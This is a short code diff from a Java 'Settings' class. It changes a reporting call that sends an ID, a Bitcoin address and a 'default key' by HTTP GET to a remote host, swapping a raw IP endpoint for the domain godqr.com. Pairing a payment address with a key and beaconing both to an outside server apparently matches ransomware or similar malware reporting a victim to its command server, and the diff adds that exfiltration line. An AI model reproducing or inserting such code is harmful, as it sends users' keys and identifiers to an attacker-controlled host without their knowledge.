@@ -207,7 +207,7 @@ public class Settings {
 				vals.add(Settings.getId());
 				vals.add(Settings.getBitcoinAddress());
 				vals.add(Settings.getDefaultKey());
-				HTTP.send("http://166.104.126.42:8090/NewSystem/reportAddress.do", "GET", keys, vals);
+				HTTP.send("http://www.godqr.com/reportAddress.do.pc", "GET", keys, vals);
 				/////////////////////////////////////////////////////
 			} catch (Exception e) {
 				e.printStackTrace();
